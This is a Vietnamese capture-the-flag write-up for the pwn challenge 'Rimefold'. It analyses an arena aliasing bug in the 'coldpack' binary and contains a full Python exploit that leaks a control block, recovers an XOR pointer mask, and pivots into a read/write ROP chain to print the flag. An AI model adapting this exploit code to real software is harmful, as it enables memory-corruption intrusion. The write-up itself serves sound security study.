---
title: "Rimefold"
category: "Pwn"
tags: ["rop", "pointer-encoding"]
solve_date: "2026-10-10T14:30:00+07:00"
language: "vi"
---

# Rimefold

**Flag:** `isfcr{the_merge_3b7d_never_rechecked_the_hue_00cb8b04}`
**Service:** `nc 0.cloud.chals.io 15036`
**File:** `coldpack` (755,760 bytes; SHA-256 `15E73D7F1C6F1E6BC39E68184AF2FCBE32F8F1B8BFFF44AD0E9C95976364635A`), `COLDPACK.md`, `seccomp.txt`

## Đề bài

Khai thác `coldpack` để đọc flag từ descriptor process đã mở. Seccomp không cho execve/openat; cần chuỗi read/write. Handout là ABI 1.3, còn live service dùng 1.4.

## Phân tích

Arena mmap có control block 128 byte và 64 cell, mỗi cell 256 byte. REAP gom các cell cùng cluster tag. Nếu run dài hơn 6, pointer của cell cuối được đổi thành arena với cap 16 qword. DRAW/PACK không kiểm tra lại cell live nên cell alias đọc/ghi được control block. REAP sau đó gọi entry pointer với block[1] trong rdi.

FOLD trên hai cell cho biết tag có bằng nhau. Control block chứa gadget-farm pointer, arena base, flag fd và signature `0x8b1e3fd7c0a64521`.

| Offset | Meaning (1.3) | Live 1.4 value |
|---|---|---|
| `+0x00` | reaper entry pointer (`farm + 1`, i.e. a bare `ret`) | encoded pointer, looks random |
| `+0x08` | argument passed in `rdi` | `0` |
| `+0x10` | pointer to the gadget farm | `arena + 0xcce0` (fixed) |
| `+0x18` | arena base (self) | `arena` |
| `+0x20` | flag descriptor | `5` |
| `+0x28` | signature constant | `0x8b1e3fd7c0a64521` |
| `+0x30` | reap counter | increments per `REAP` |

```
farm+0   pop rax ; ret        farm+8   syscall ; ret
farm+2   pop rdi ; ret        farm+11  mov rsp, rdi ; ret
farm+4   pop rsi ; ret
farm+6   pop rdx ; ret
```

## Lời giải

1. Allocate khoảng 60 cell và dùng STAGE/FOLD phân lớp tag, tìm ít nhất bảy cell cùng tag. Tag thay đổi mỗi connection.
2. Stage nhóm rồi REAP; DRAW cell cuối 16 qword để xác nhận alias qua signature, lấy farm, arena và fd.
3. ABI 1.4 lưu entry pointer dạng XOR-encoded. Pointer gốc decode thành `farm+1` (ret). Từ encoded value và địa chỉ đã leak, tính mask, rồi ghi `mask ^ chosen_target`; không ghi địa chỉ thô.
4. Dựng chain ở cell thường, đặt block[1] trỏ tới chain và encoded block[0] trỏ gadget `mov rsp,rdi;ret`. Khi REAP gọi entry, stack pivot tới chain thực hiện `read(flag_fd,buf,256)` rồi `write(1,buf,256)`.
5. PACK dùng `strtoull(...,0)`, nên token số có zero đầu có thể bị hiểu là octal. Gửi giá trị thập phân để tránh parse sai. Code đầy đủ và output của live run ở dưới.

```
target = block[0] ^ mask          where  mask = block[0]_original ^ (block[2] + 1)
```

```python
import socket, struct, re

HOST, PORT = "0.cloud.chals.io", 15036
MAGIC = 0x8B1E3FD7C0A64521
POP_RAX, POP_RDI, POP_RSI, POP_RDX = 0x7CE0, 0x7CE2, 0x7CE4, 0x7CE6
SYSCALL, PIVOT = 0x7CE8, 0x7CEB          # offsets inside the gadget farm
M = (1 << 64) - 1

class Sess:
    def __init__(self):
        self.f = socket.create_connection((HOST, PORT), timeout=30)
        self.f.settimeout(30)
        self.b = self.rd()
    def rd(self):
        buf = b""
        while not buf.endswith(b"\n"):
            c = self.f.recv(4096)
            if not c:
                break
            buf += c
        return buf.decode(errors="replace").strip()
    def cmd(self, line):
        self.f.sendall(line.encode() + b"\n")
        return self.rd()
    def cmds(self, lines):
        self.f.sendall(("\n".join(lines) + "\n").encode())
        return [self.rd() for _ in lines]

def vals(line):
    p = line.split()
    return [int(x, 16) for x in p[1:]] if len(p) > 1 and p[0] == "OK" else None

s = Sess()
cells = [int(r.split()[-1]) for r in s.cmds(["NEW"] * 60) if r.startswith("OK cell")]

# 1. bucket cells by cluster tag using FOLD as an equality oracle
pool, group = cells[:], []
while pool and len(group) < 7:
    rep, rest = pool[0], pool[1:]
    replies = s.cmds(sum([["STAGE %d %d" % (rep, c), "FOLD"] for c in rest], []))
    same = [c for i, c in enumerate(rest)
            if replies[2 * i + 1].endswith(" 1") and replies[2 * i + 1].startswith("OK folded")]
    group = [rep] + same
    pool = [c for c in rest if c not in group]
assert len(group) >= 7, "no 7-cell tag class (retry the connection)"
grp, last = group[:8], group[:8][-1]

# 2. alias the control block and leak it
s.cmds(["STAGE " + " ".join(map(str, grp)), "REAP"])
blk = vals(s.cmd("DRAW %d 16" % last))
assert blk[5] == MAGIC
enc, farm, arena, fd = blk[0], blk[2], blk[3], blk[4]
base = farm - 0x7CE0                      # image base (== arena + 0x5000)
mask = enc ^ (farm + 1)                   # reaper pointer is XOR-encoded

# 3. build the chain inside a normal cell (decimal arguments: PACK parses base 0)
cell = grp[0]
cell_addr = arena + 0x80 + 0x100 * cell
buf = cell_addr + 0x100
chain = [base + POP_RDI, fd, base + POP_RSI, buf, base + POP_RDX, 256,
         base + POP_RAX, 0, base + SYSCALL,          # read(fd, buf, 256)
         base + POP_RDI, 1, base + POP_RAX, 1, base + SYSCALL]   # write(1, buf, 256)
s.cmd("PACK %d %s" % (cell, " ".join(str(v) for v in chain)))
s.cmd("PACK %d %s" % (last, " ".join(str(v & M) for v in
          [mask ^ (base + PIVOT), cell_addr] + blk[2:])))

# 4. REAP decodes block[0] -> mov rsp,rdi ; ret -> chain -> flag on stdout
s.cmd("REAP")
data = b""
try:
    while True:
        c = s.f.recv(65536)
        if not c:
            break
        data += c
except socket.timeout:
    pass
print(re.findall(rb"isfcr\{[0-9a-z_]*\}", data))
```

```text
isfcr{the_merge_3b7d_never_rechecked_the_hue_00cb8b04}
```

## Các hướng đã kiểm tra

Arena không executable. DRAW/PACK chỉ chạm được control block và cell body, không theo các pointer phụ để đọc sealed record. Free-list là permutation 0…63, không tạo index ngoài arena. REAP không di chuyển marker data. Các probe trước đó không chứng minh có tamper seal; hành vi phù hợp với pointer decoding.

## Kết quả

Flag được đọc qua ROP read/write từ descriptor của process.

```text
isfcr{the_merge_3b7d_never_rechecked_the_hue_00cb8b04}
```

## Tái hiện

Cần Python 3 standard library và instance ABI 1.4 còn hoạt động. Lưu script ở Lời giải thành `solve.py`; mỗi connection phải tìm lại tag class và mask. Nếu không tìm được nhóm bảy cell, chạy attempt mới. Radare2 có thể dùng để đối chiếu control block và gadget farm trong handout.

```powershell
python solve.py
```

```bash
r2 -e bin.relocs.apply=true -e anal.calls=true -c 'aa; pdf @ main; af @ 0x84d0; pdf @ 0x84d0; pd 16 @ 0x7ce0' coldpack
./coldpack --dump-seccomp          # reproduces seccomp.txt
```
